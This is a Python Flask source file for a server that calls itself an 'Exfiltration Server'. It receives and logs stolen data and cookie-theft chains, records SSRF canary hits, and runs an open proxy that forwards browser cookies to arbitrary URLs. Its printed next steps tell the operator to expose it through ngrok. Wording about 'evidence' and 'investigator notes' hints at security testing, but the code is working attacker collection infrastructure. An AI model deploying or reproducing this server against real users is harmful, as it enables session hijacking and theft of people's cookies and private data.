from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import requests
import uuid
from datetime import datetime
import requests
N8N_WEBHOOK = "http://localhost:5678/webhook-test/collect-evidence"  # ← Your n8n URL

app = Flask(__name__)

# Enable CORS with credentials support
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True
    }
})

# Store collected data in memory (use database in production)
collected_data = []
evidence_data = []
canary_hits = {}

@app.route('/canary/<canary_id>', methods=['GET'])
def ssrf_canary(canary_id):
    hit = {
        'canary_id': canary_id,
        'timestamp': datetime.utcnow().isoformat(),
        'user_agent': request.headers.get('User-Agent', 'unknown'),
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'headers': dict(request.headers)
    }
    canary_hits[canary_id] = hit

    with open('ssrf_canary_hits.jsonl', 'a', encoding='utf-8') as f:
        f.write(json.dumps(hit) + '\n')

    print(f"\nSSRF CANARY HIT!")
    print(f"Canary ID: {canary_id}")
    print(f"From: {hit['ip']} | UA: {hit['user_agent'][:60]}")
    print(f"{'='*60}\n")

    return "OK", 200

@app.route('/proxy-fetch', methods=['POST', 'OPTIONS'])
def proxy_fetch():
    if request.method == 'OPTIONS':
        return '', 204
    
    data = request.get_json(force=True)
    target_url = data.get('targetUrl')
    method = data.get('method', 'GET')
    
    if not target_url:
        return jsonify({'error': 'targetUrl required'}), 400
    
    try:
        print(f"\n{'='*60}")
        print(f"PROXY REQUEST")
        print(f"Target: {target_url}")
        print(f"Method: {method}")
        print(f"Client Cookies: {request.cookies}")
        print(f"{'='*60}")
        
        # Forward cookies from browser to target
        forward_cookies = request.cookies  # This is a dict
        cookie_header = '; '.join([f"{k}={v}" for k, v in forward_cookies.items()]) if forward_cookies else None

        # Forward other important headers
        headers = {
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
            'Accept': request.headers.get('Accept', '*/*'),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
            'Referer': request.headers.get('Referer', ''),
            'Origin': request.headers.get('Origin', ''),
        }
        if cookie_header:
            headers['Cookie'] = cookie_header

        # Optional: Allow body forwarding
        client_data = None
        if request.content_length and request.content_length > 0:
            client_data = request.get_data()

        response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            data=client_data,  # Forward body if sent
            cookies=forward_cookies,  # Also pass as cookies dict
            timeout=15,
            allow_redirects=True
        )
        
        # Forward Set-Cookie back to browser (so cookies persist!)
        flask_response = jsonify({
            'ok': True,
            'data': {
                'status': response.status_code,
                'statusText': response.reason,
                'headers': dict(response.headers),
                'content': response.text[:10000],
                'fullSize': len(response.text),
                'url': response.url
            }
        })

        # Forward Set-Cookie headers
        set_cookie = response.headers.get('Set-Cookie')
        if set_cookie:
            flask_response.headers['Set-Cookie'] = set_cookie

        # Also handle multiple Set-Cookie
        if 'Set-Cookie' in response.headers:
            for cookie in response.headers.getlist('Set-Cookie'):
                flask_response.headers.add('Set-Cookie', cookie)

        print(f"Status: {response.status_code} | Cookies forwarded: {bool(cookie_header)}")
        print(f"{'='*60}\n")
        
        return flask_response
        
    except Exception as e:
        print(f"Proxy error: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/collect-evidence', methods=['POST', 'OPTIONS'])
def collect_evidence():
    """Collect evidence from cookie injection tests"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json(force=True)
        evidence_type = data.get('type', 'unknown')
        timestamp = data.get('timestamp')
        test_data = data.get('data', {})
        metadata = data.get('metadata', {})
        
        # Handle if test_data is a list
        if isinstance(test_data, list):
            test_data = test_data[0] if test_data else {}
        
        # Add server metadata
        record = {
            'timestamp': timestamp or datetime.utcnow().isoformat(),
            'type': evidence_type,
            'data': test_data,
            'metadata': metadata,
            'server_received_at': datetime.utcnow().isoformat(),
            'source_ip': request.headers.get('X-Forwarded-For', request.remote_addr)
        }
        
        # Store in memory
        evidence_data.append(record)
        
        # Log to console
        print(f"\n{'='*70}")
        print(f"📥 EVIDENCE RECEIVED: {evidence_type}")
        print(f"{'='*70}")
        print(f"Timestamp: {record['timestamp']}")
        
        if isinstance(test_data, dict):
            print(f"Target: {test_data.get('target', 'N/A')}")
            print(f"Success: {test_data.get('success', False)}")
            if test_data.get('response'):
                print(f"Status: {test_data['response'].get('status', 'N/A')}")
        
        print(f"{'='*70}\n")
        
        # Save to file
        with open('cookie_injection_evidence.jsonl', 'a', encoding='utf-8') as f:
            f.write(json.dumps(record) + '\n')
        
        return jsonify({
            'ok': True,
            'received_at': record['server_received_at'],
            'evidence_id': f"evidence-{len(evidence_data)}"
        }), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/collect-chain', methods=['POST'])
def collect_chain():
    data = request.get_json()
    evidence = {
        'type': 'cookie_theft_chain',
        'timestamp': datetime.utcnow().isoformat(),
        'data': data,
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr)
    }
    with open('cookie_theft_chains.jsonl', 'a') as f:
        f.write(json.dumps(evidence) + '\n')
    return jsonify({'ok': True}), 200

@app.route('/collect-data', methods=['POST', 'OPTIONS'])
def collect_data():
    """Backwards compatibility endpoint"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json(force=True)
        data['received_at'] = datetime.utcnow().isoformat()
        data['source_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
        data['user_agent'] = request.headers.get('User-Agent', 'unknown')
        
        collected_data.append(data)
        
        print("\n" + "="*70)
        print("🚨 STOLEN DATA RECEIVED 🚨")
        print("="*70)
        print(f"Timestamp: {data['received_at']}")
        print(f"Source IP: {data['source_ip']}")
        print(f"Target URL: {data.get('leakedData', {}).get('url', 'N/A')}")
        print("="*70 + "\n")
        
        with open('exfiltrated_data.jsonl', 'a', encoding='utf-8') as f:
            f.write(json.dumps(data) + '\n')
        
        return jsonify({
            'status': 'success',
            'message': 'Data received successfully',
            'received_at': data['received_at'],
            'data_id': len(collected_data)
        }), 200
        
    except Exception as e:
        print(f"\n❌ ERROR: {e}\n")
        return jsonify({'status': 'error', 'message': str(e)}), 400


@app.route('/view-data', methods=['GET'])
def view_data():
    """View all collected data"""
    return jsonify({
        'total_collected': len(collected_data),
        'data': collected_data
    })


@app.route('/evidence', methods=['GET'])
def get_evidence():
    """View all evidence"""
    return jsonify({
        'total_evidence': len(evidence_data),
        'evidence': evidence_data
    })


@app.route('/notes', methods=['POST', 'OPTIONS'])
def save_notes():
    """Save investigator notes"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json(force=True)
        
        record = {
            'timestamp': data.get('timestamp', datetime.utcnow().isoformat()),
            'target': data.get('target'),
            'notes': data.get('notes'),
            'user_agent': data.get('user_agent', request.headers.get('User-Agent')),
            'url': data.get('url'),
            'ip': request.headers.get('X-Forwarded-For', request.remote_addr)
        }
        
        # Log to console
        print(f"\n{'='*70}")
        print(f"📝 NOTES RECEIVED")
        print(f"{'='*70}")
        print(f"Timestamp: {record['timestamp']}")
        print(f"Target: {record['target']}")
        print(f"Notes length: {len(record['notes'])} chars")
        print(f"\nNotes:")
        print(record['notes'][:200])
        if len(record['notes']) > 200:
            print('...')
        print(f"{'='*70}\n")
        
        # Save to file
        with open('notes.log', 'a', encoding='utf-8') as f:
            f.write(json.dumps(record, ensure_ascii=False) + '\n')
        
        return jsonify({
            'ok': True,
            'saved_file': 'notes.log',
            'timestamp': record['timestamp']
        }), 200
        
    except Exception as e:
        print(f"❌ Error saving notes: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'running',
        'port': 3000,
        'collected_count': len(collected_data),
        'evidence_count': len(evidence_data)
    })


@app.route('/', methods=['GET'])
def home():
    """Root endpoint with instructions"""
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Exfiltration Server</title>
        <style>
            body {{ font-family: monospace; background: #0a0e1a; color: #6ee7b7; padding: 20px; }}
            .status {{ background: #131823; padding: 15px; border-radius: 8px; border: 1px solid #1e2837; margin: 10px 0; }}
            .data {{ background: #0b1020; padding: 10px; margin: 10px 0; border-radius: 4px; }}
            .success {{ color: #6ee7b7; }}
            .error {{ color: #fca5a5; }}
            a {{ color: #93c5fd; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
        </style>
    </head>
    <body>
        <h1>🚨 Exfiltration Server</h1>
        <div class="status">
            <p><strong>Status:</strong> <span class="success">ACTIVE</span></p>
            <p><strong>Port:</strong> 3000</p>
            <p><strong>Data Collected:</strong> {len(collected_data)}</p>
            <p><strong>Evidence Collected:</strong> {len(evidence_data)}</p>
        </div>
        
        <div class="status">
            <h3>Endpoints:</h3>
            <ul>
                <li>POST /collect-evidence - Cookie injection evidence</li>
                <li>POST /collect-data - General data collection</li>
                <li>POST /proxy-fetch - CORS bypass proxy</li>
                <li>POST /notes - Save investigator notes</li>
                <li>GET /health - Health check</li>
                <li>GET /evidence - View evidence (JSON)</li>
                <li>GET /view-data - View data (JSON)</li>
            </ul>
        </div>
        
        <h2>Recent Evidence:</h2>
        {''.join([f'<div class="data"><pre>{json.dumps(d, indent=2)[:300]}</pre></div>' for d in evidence_data[-5:]])}
        
        <p><a href="/evidence">View All Evidence (JSON)</a></p>
        <p><a href="/view-data">View All Data (JSON)</a></p>
    </body>
    </html>
    """
    return html


if __name__ == '__main__':
    print("\n" + "="*70)
    print("🚨 EXFILTRATION LISTENER STARTING")
    print("="*70)
    print("Port: 3000")
    print("Endpoints:")
    print("  - POST /collect-evidence (Cookie injection)")
    print("  - POST /collect-data (General data)")
    print("  - POST /proxy-fetch (CORS bypass)")
    print("  - POST /notes (Investigator notes)")
    print("="*70)
    print("\nNEXT STEPS:")
    print("1. In another terminal, run: ngrok http 3000")
    print("2. Copy the ngrok HTTPS URL")
    print("3. In your HTML, set Server URL to your ngrok URL")
    print("4. Click 'Test Server Connection' to verify")
    print("="*70 + "\n")
    
    app.run(host='0.0.0.0', port=3000, debug=True)
